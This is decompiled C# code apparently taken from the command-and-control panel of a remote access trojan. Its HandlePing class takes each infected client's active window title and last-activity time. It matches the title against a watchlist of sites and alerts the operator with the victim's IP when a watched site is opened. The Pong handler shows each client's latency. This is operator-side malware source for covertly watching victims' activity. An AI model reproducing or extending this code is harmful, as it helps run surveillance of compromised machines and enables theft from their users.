using System;
using System.Drawing;
using System.Threading;
using Server.Connection;
using Server.MessagePack;
using Server.Properties;

namespace Server.Handle_Packet
{
	// Token: 0x0200006C RID: 108
	public class HandlePing
	{
		// Token: 0x060002FD RID: 765 RVA: 0x000205F0 File Offset: 0x0001E7F0
		public void Ping(Clients client, MsgPack unpack_msgpack)
		{
			try
			{
				MsgPack msgPack = new MsgPack();
				msgPack.ForcePathObject("Packet").SetAsString("pong");
				ThreadPool.QueueUserWorkItem(new WaitCallback(client.Send), msgPack.Encode2Bytes());
				string asString = unpack_msgpack.ForcePathObject("Message").AsString;
				string asString2 = unpack_msgpack.ForcePathObject("LastTime").AsString;
				object lockListviewClients = Settings.LockListviewClients;
				lock (lockListviewClients)
				{
					if (client.LV != null)
					{
						client.LV.SubItems[Program.form1.lv_act.Index].Text = asString;
					}
				}
				client.LV.SubItems[Program.form1.lv_last.Index].Text = asString2;
				foreach (string text in Settings.Default.sites.Split(new string[]
				{
					","
				}, StringSplitOptions.None))
				{
					if (asString.ToLower().Contains(text.ToLower()))
					{
						string text2 = string.Concat(new string[]
						{
							client.Ip,
							":",
							client.TcpClient.LocalEndPoint.ToString().Split(new char[]
							{
								':'
							})[1],
							":",
							asString
						});
						if (!Program.form1.listBox1.Items.Contains(text2))
						{
							Program.form1.listBox1.Items.Add(text2);
							client.LV.ForeColor = Color.DarkOrchid;
							if (Settings.Default.Notification)
							{
								Program.form1.notifyIcon1.BalloonTipText = string.Concat(new string[]
								{
									"Client\r\n",
									client.Ip,
									" : ",
									client.TcpClient.LocalEndPoint.ToString().Split(new char[]
									{
										':'
									})[1],
									" Open : ",
									asString
								});
								Program.form1.notifyIcon1.ShowBalloonTip(100);
							}
						}
					}
				}
			}
			catch
			{
			}
		}

		// Token: 0x060002FE RID: 766 RVA: 0x00020864 File Offset: 0x0001EA64
		public void Pong(Clients client, MsgPack unpack_msgpack)
		{
			try
			{
				object lockListviewClients = Settings.LockListviewClients;
				lock (lockListviewClients)
				{
					if (client.LV != null)
					{
						int num = (int)unpack_msgpack.ForcePathObject("Message").AsInteger;
						client.LV.SubItems[Program.form1.lv_ping.Index].Text = num.ToString() + " MS";
						if (num > 400)
						{
							client.LV.SubItems[Program.form1.lv_ping.Index].ForeColor = Color.Red;
						}
						else if (num > 200)
						{
							client.LV.SubItems[Program.form1.lv_ping.Index].ForeColor = Color.Orange;
						}
						else
						{
							client.LV.SubItems[Program.form1.lv_ping.Index].ForeColor = Color.Green;
						}
					}
				}
			}
			catch
			{
			}
		}
	}
}
